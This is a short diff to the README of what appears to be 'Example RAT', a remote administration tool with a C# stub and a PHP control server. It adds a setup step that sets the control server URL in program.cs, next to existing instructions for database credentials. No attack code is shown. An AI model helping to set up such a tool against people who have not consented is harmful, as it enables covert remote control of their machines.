@@ -5,6 +5,9 @@ find this line in all php files and add your credintials and link to database an
 
 	$db = new mysqli('link to data base here', 'user here','password here', 'data base name here');
 
+in program.cs file line 73 find this line and set url for your control server
+       
+       ConnectionIPHandler.IPSet("set url for your control server");
 
 Example RAT is a remote administration tool written in C# for the stub and PHP for the front-end control server.
 
